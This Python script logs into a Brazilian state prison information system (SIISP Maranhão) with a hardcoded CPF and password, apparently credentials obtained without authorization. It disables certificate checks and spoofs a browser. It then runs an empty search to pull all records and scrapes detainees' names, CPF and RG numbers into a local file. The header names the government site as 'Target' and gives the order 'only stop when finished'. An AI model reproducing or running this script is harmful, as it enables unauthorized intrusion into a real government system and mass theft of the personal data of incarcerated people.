#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP - Buscar Identificacao de Pessoa
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Ordem: SÓ PARAR QUANDO FINALIZADO
"""

import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://siisp.ma.gov.br/SIISP"
TARGET_URL = "https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa"
CPF = "035.176.123-32"
SENHA = "marlon89"

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def extract_viewstate(html):
    soup = BeautifulSoup(html, "html.parser")
    vs_input = soup.find("input", {"name": "javax.faces.ViewState"})
    if vs_input:
        return vs_input.get("value", "")
    return ""

# ==================== FASE 1: LOGIN ====================
print("[*] FASE 1: LOGIN")
login_url = f"{BASE_URL}/login"
r1 = session.get(login_url, allow_redirects=True, timeout=30)
vs = extract_viewstate(r1.text)
print(f"  ViewState: {vs}")

login_data = {
    "form": "form",
    "cpf": CPF,
    "senha": SENHA,
    "javax.faces.ViewState": vs,
    "btLogin": "btLogin",
}

r2 = session.post(login_url, data=login_data, allow_redirects=True, timeout=30)
print(f"  Login status: {r2.status_code}, URL: {r2.url}")

# ==================== FASE 2: BUSCAR PESSOA ====================
print("\n[*] FASE 2: BUSCAR PESSOA")

# Get the page first to extract ViewState
r3 = session.get(TARGET_URL, allow_redirects=True, timeout=30)
vs2 = extract_viewstate(r3.text)
print(f"  ViewState busca: {vs2}")

# Buscar com campos vazios primeiro (retorna todos)
busca_data = {
    "form": "form",
    "itNome": "",
    "itRg": "",
    "itCpf": "",
    "itNomeMae": "",
    "itNomePai": "",
    "cdNascimento_input": "",
    "javax.faces.ViewState": vs2,
    "btnBuscarDetento": "btnBuscarDetento",  # JSF source
}

print("\n[*] Enviando busca com campos vazios...")
r4 = session.post(TARGET_URL, data=busca_data, allow_redirects=True, timeout=30)
print(f"  Status: {r4.status_code}, URL: {r4.url}")
print(f"  Tamanho: {len(r4.text)} bytes")

# Save result
with open("siisp_busca_resultado.html", "w", encoding="utf-8") as f:
    f.write(r4.text)
print("  [+] Resultado salvo em: siisp_busca_resultado.html")

# Parse resultado
soup4 = BeautifulSoup(r4.text, "html.parser")

# Look for data table
print("\n[*] Analisando resultado...")

# Buscar tabelas de dados
all_tables = soup4.find_all("table")
print(f"  Tabelas encontradas: {len(all_tables)}")

# Buscar por tabela de resultados
for i, table in enumerate(all_tables):
    rows = table.find_all("tr")
    if len(rows) > 1:
        # Check if this has data cells
        headers = table.find_all("th")
        if headers:
            print(f"\n  Tabela {i} (provavel resultado): {len(rows)} linhas")
            header_texts = [h.get_text(strip=True) for h in headers]
            print(f"    Headers: {header_texts}")
            
            # Print first few rows
            data_rows = rows[1:4]  # Skip header, get first 3 data rows
            for row in data_rows:
                cells = row.find_all(["td", "th"])
                data = [c.get_text(strip=True) for c in cells]
                print(f"    {data}")

# Buscar divs com dados
print("\n[*] Buscando divs de resultado...")
for div in soup4.find_all("div", class_=re.compile("(result|list|data|pessoa|detento)")):
    text = div.get_text(strip=True)
    if text and len(text) > 10:
        print(f"  {text[:150]}")

# Buscar por nomes de pessoas
print("\n[*] Buscando nomes de pessoas...")
text = soup4.get_text()
# Procurar padroes de nome proprio
nome_pattern = re.findall(r'([A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+)', text)
if nome_pattern:
    for n in list(set(nome_pattern))[:10]:
        print(f"  {n}")

# Buscar por CPFs
cpf_pattern = re.findall(r'\d{3}\.\d{3}\.\d{3}-\d{2}', text)
if cpf_pattern:
    print(f"\n[*] CPFs encontrados:")
    for c in set(cpf_pattern)[:10]:
        print(f"  {c}")

# Buscar por RGs
rg_pattern = re.findall(r'\d{1,2}\.\d{3}\.\d{3}-\d{1}', text)
if rg_pattern:
    print(f"\n[*] RGs encontrados:")
    for r in set(rg_pattern)[:10]:
        print(f"  {r}")

print("\n[*] FIM DA BUSCA")
